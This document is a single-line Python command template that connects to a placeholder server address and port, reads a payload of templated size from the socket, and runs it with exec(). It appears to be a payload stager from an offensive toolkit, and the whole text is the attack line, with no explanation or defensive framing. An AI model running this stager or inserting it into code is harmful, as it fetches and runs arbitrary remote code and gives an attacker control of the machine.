python3 -c 'import socket; s=socket.socket(); s.connect(("{{SERVER_IP}}", {{SERVER_PORT}})); data = b"".join([s.recv(1) for i in range(0, {{PAYLOAD_SIZE}})]); s.close(); exec(data);'
